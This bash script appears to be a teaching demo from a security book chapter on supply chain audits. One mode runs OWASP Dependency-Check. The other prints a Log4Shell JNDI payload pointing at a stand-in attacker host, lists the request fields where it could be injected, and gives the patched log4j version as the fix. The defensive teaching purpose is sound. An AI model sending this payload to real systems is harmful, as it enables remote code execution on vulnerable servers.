#!/usr/bin/env bash
#
# Chapter 27 — Supply chain audit
#
# Two-mode demo:
#   - "scan": run OWASP Dependency-Check against backend/pom.xml and
#     show which CVEs are present.
#   - "log4shell-poc": craft the JNDI string an attacker would inject if
#     log4j-core 2.14.1 were actually wired into the request path.
#
# This script does not actually exploit — it just shows the artifacts.
# The defensive point is: catch this in CI before deploy.

set -euo pipefail
MODE="${1:-scan}"
REPO=${REPO:-/Users/e141057/Desktop/work/clade_play_area/security-book-code}

bold() { printf '\033[1m%s\033[0m\n' "$*"; }
gray() { printf '\033[90m%s\033[0m\n' "$*"; }

case "$MODE" in
  scan)
    bold "[1/1] Run OWASP Dependency-Check against backend/pom.xml"
    echo "  This may take 5-15 minutes the first run (downloads NVD CVE feed ~600 MB)."
    echo
    cd "$REPO/backend"
    mvn -B org.owasp:dependency-check-maven:11.1.1:check 2>&1 | tail -30 || true
    REPORT="$REPO/backend/target/dependency-check-report.html"
    if [ -f "$REPORT" ]; then
      echo
      bold "Report: $REPORT"
      echo "  Open in a browser to see every CVE, CVSS score, and affected jar."
    fi
    ;;

  log4shell-poc)
    bold "[1/2] The Log4Shell payload"
    PAYLOAD='${jndi:ldap://attacker.example/Exploit}'
    gray "  $PAYLOAD"
    echo
    echo "  An attacker drops this string anywhere log4j 2.14.1 will format it:"
    echo "    - User-Agent header"
    echo "    - X-Forwarded-For header"
    echo "    - Username field of a login attempt"
    echo "    - URL path"
    echo "  The line:  log.info(\"GET {}\", userInput)  triggers it."
    echo

    bold "[2/2] What happens server-side"
    echo "  log4j sees the format string, evaluates the JNDI lookup, fetches"
    echo "  the malicious class from attacker-controlled LDAP, deserializes it,"
    echo "  and runs it inside your JVM. CVSS 10.0 — full RCE."
    echo
    echo "  Defense: any version of log4j 2.17.1+ removes JNDI lookup support"
    echo "  in format strings. Pinning via dependencyManagement (see fixed/"
    echo "  pom-snippet.xml) closes the door regardless of transitive deps."
    ;;

  *)
    echo "Usage: $0 [scan|log4shell-poc]"
    exit 1
    ;;
esac
